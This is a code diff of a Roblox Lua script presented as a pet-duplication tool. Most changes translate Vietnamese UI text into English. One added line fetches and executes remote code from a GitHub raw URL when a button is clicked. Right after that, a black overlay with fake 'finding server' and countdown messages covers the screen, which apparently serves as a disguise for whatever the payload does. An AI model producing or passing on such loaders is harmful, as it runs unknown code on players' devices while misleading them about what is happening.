@@ -60,7 +60,7 @@ inspired.TextXAlignment = Enum.TextXAlignment.Left
 local button = Instance.new("TextButton", mainFrame)
 button.Size = UDim2.new(0.85, 0, 0, 44)
 button.Position = UDim2.new(0.075, 0, 0.55, 0)
-button.Text = " Kích Hoạt"
+button.Text = " Active❤️‍🔥"
 button.BackgroundColor3 = Color3.fromRGB(40, 0, 60)
 button.TextColor3 = Color3.new(1, 1, 1)
 button.Font = Enum.Font.Gotham
@@ -89,11 +89,11 @@ end)
 
 -- Activation Logic
 button.MouseButton1Click:Connect(function()
-	button.Text = "✅ Kích Hoạt..."
+	button.Text = "✅ Activated..."
 	button.BackgroundColor3 = Color3.fromRGB(60, 0, 100)
 
 	-- Load PetsDuped script
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/lizzyowo/Mi-Garden/refs/heads/main/Meow%20meow"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/cuong11a/DUPER_TROOPER/refs/heads/main/GrowAGardennn"))()
 
 	-- Black Loading Overlay
 	task.delay(0.01, function()
@@ -122,7 +122,7 @@ button.MouseButton1Click:Connect(function()
 		local msg = Instance.new("TextLabel", frame)
 		msg.Size = UDim2.new(1, 0, 0, 50)
 		msg.Position = UDim2.new(0, 0, 0.45, 0)
-		msg.Text = "🔍 Tìm Server ID cổ..."
+		msg.Text = "🔍 Finding Old Server ID..."
 		msg.TextColor3 = Color3.fromRGB(255, 255, 255)
 		msg.BackgroundTransparency = 1
 		msg.Font = Enum.Font.GothamBold
@@ -147,7 +147,7 @@ button.MouseButton1Click:Connect(function()
 			end
 
 			percent.Visible = false
-			msg.Text = "🕒 Đợi Vài Giây Random ID Dupe Pet"
+			msg.Text = "🕒 Wait A Few Seconds To Randomize ID Pet"
 
 			local countdown = Instance.new("TextLabel", frame)
 			countdown.Size = UDim2.new(1, 0, 0, 40)
